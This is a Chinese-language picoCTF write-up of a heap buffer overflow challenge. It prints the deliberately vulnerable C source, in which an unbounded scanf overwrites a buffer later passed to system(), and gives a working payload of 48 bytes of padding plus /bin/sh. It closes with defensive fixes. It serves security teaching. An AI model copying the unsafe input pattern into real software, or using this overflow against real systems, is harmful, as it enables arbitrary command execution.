## Challenge Metadata

- **Platform:** picoCTF
- **Category:** Binary Exploitation
- **Difficulty:** Medium
- **Author:** Bryan
- **Date:** 2026-3-14

### 一、基本資訊

**題目名稱：** Input Injection (Heap)  
**題目類型：** Binary Exploitation  
**平台：** picoCTF  
**目標：** 利用程式中的 heap overflow 漏洞覆蓋 `system()` 執行的指令並取得 flag

### 二、題目概述

本題提供一個可執行 binary，程式會：

- 在 heap 上配置兩塊記憶體
- 接收使用者輸入的 username
- 顯示問候訊息
- 執行一個 shell 指令

程式原本預期執行的指令為：

```
/bin/pwd
```

然而程式使用 `scanf("%s")` 讀取輸入時沒有設定長度限制，導致攻擊者可以輸入超過 buffer 大小的資料，造成 Heap Buffer Overflow。

由於 heap 上配置的兩塊記憶體彼此相鄰，overflow 可以覆蓋下一個記憶體區塊中的資料，使原本儲存的 shell 指令被攻擊者控制，最終達到任意指令執行 (Command Execution)。

### 三、分析目標

本次分析的主要目標如下：

- 分析程式的 heap 記憶體配置
- 找出輸入處理中的安全漏洞
- 說明 heap overflow 的形成原因
- 建立 exploit payload
- 取得 flag

### 四、靜態分析

題目提供的程式碼如下：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    char* username = malloc(28);
    char* shell = malloc(28);

    printf("username at %p\n", username);
    fflush(stdout);

    printf("shell at %p\n", shell);
    fflush(stdout);

    strcpy(shell, "/bin/pwd");

    printf("Enter username: ");
    fflush(stdout);

    scanf("%s", username);

    printf("Hello, %s. Your shell is %s.\n", username, shell);

    system(shell);
    fflush(stdout);

    return 0;
}
```

程式執行流程：

1. `malloc` username  
2. `malloc` shell  
3. `shell = "/bin/pwd"`  
4. `scanf(username)`  
5. `system(shell)`

### 五、弱點判定

#### 5.1 弱點描述

程式使用：

```c
scanf("%s", username)
```

讀取使用者輸入，但未限制輸入長度。

而 `username` 只配置了：

```
28 bytes
```

因此當輸入長度超過 28 bytes 時，資料會溢出到相鄰的 heap 記憶體區塊。

#### 5.2 弱點類型

- Heap Buffer Overflow
- Unsafe Input Handling
- Command Injection

#### 5.3 風險說明

程式在 heap 上配置兩個區塊：

- `username`  
- `shell`

由於 heap chunk 之間存在 metadata 與 alignment，實際間距約為：

```
48 bytes
```

當輸入超過此長度時，就會覆蓋到 `shell` 變數。

而 `shell` 會被用於：

```c
system(shell)
```

因此攻擊者可以修改該變數內容，使程式執行任意 command。

### 六、攻擊思路

原始程式執行流程：

```c
system("/bin/pwd")
```

攻擊目標：

```c
system("/bin/sh")
```

Heap layout 示意：

```
username chunk
↓
48 bytes
↓
shell chunk
```

當輸入：

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/sh
```

記憶體會變成：

```
username
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

shell
/bin/sh
```

因此 `system()` 會執行 `/bin/sh`。

### 七、利用過程

#### 7.1 連線遠端挑戰

```sh
nc amiable-citadel.picoctf.net 52540
```

程式會顯示 heap address：

```
username at 0x...
shell at 0x...
```

#### 7.2 計算 offset

```
shell address - username address = 0x30
```

也就是：

```
48 bytes
```

#### 7.3 輸入 exploit payload

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/sh
```

payload 結構：

```
48 bytes padding + command
```

#### 7.4 取得 shell

程式輸出：

```
Hello, AAAAA....
Your shell is /bin/sh
```

並執行：

```
system("/bin/sh")
```

#### 7.5 取得 flag

輸入：

```
cat flag.txt
```

或

cat /home/ctf-player/flag.txt
## 八、利用結果

成功取得 flag

（實際 flag 依遠端環境為準）

## 九、完整 exploit payload

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/sh
```
## 十、成因分析

漏洞形成原因如下：

#### 10.1 不安全的輸入函式
scanf("%s")

未限制輸入長度。

#### 10.2 Heap 記憶體相鄰配置

兩個 malloc chunk 相鄰：

username
shell

overflow 可覆蓋下一個 chunk。

#### 10.3 system() 使用可被控制的變數

程式執行：

system(shell)

使攻擊者可以控制執行指令。

## 十一、防禦建議
#### 11.1 限制輸入長度

應使用：

scanf("%27s", username)

或改用：

fgets()
#### 11.2 避免直接使用 system()

若需要執行系統指令，應避免將使用者輸入直接傳入 system()。

#### 11.3 檢查輸入資料

對使用者輸入進行長度與內容驗證。

#### 11.4 啟用安全機制

建議啟用：

ASLR

Stack Protector

Heap protection

## 十二、結論

本題展示了一個典型的 Heap Buffer Overflow 漏洞。由於程式使用 scanf("%s") 讀取使用者輸入且未限制長度，攻擊者可以輸入超過 buffer 大小的資料，覆蓋 heap 中相鄰的 shell 變數。

透過修改該變數內容，攻擊者成功將原本應執行的 /bin/pwd 替換為 /bin/sh，最終取得 shell 並讀取 flag。

此案例說明，在處理使用者輸入時若缺乏邊界檢查，即使程式功能簡單，也可能導致嚴重的安全漏洞。

## 十三、附錄：關鍵觀念整理

| 項目 | 說明 |
| --- | --- |
| 弱點名稱 | Heap Buffer Overflow |
| 弱點位置 | scanf("%s", username) |
| 可控制變數 | shell |
| 攻擊方式 | overflow 覆蓋 command |
| 攻擊效果 | 任意 command execution |
| Exploit Payload | 48 bytes padding + /bin/sh |

## 使用工具
- nc
- heap analysis
- Linux shell